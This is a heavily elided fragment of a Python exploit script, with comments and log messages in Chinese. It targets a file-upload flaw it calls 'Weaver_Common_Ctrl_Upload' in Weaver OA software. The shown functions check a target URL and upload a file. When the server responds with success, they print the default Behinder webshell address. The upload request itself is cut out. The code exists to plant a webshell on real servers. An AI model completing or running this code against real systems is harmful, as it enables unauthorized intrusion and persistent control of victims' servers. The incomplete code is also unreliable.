...
def GetShell(urllist):
    ...
    print(now_time() + " [INFO]     上传文件中#23333333333333")
    ...
    try:
        ...
        if GetShelllist.status_code == 200:
            print(now_time() + "[SUCCESS]  利用成功默认冰蝎webshell地址为: " + GetShellurl)
            return 'ok'
        else:
            print(now_time() + " [WARNING]  不存在Weaver_Common_Ctrl_Upload漏洞")
    except:
...
def main(target_url):
    ...
    if target_url[-1] != '/':
        target_url += '/'
    print(now_time() + " [INFO]     正在检测Weaver_Common_Ctrl_Upload漏洞")
    GetShell(target_url)
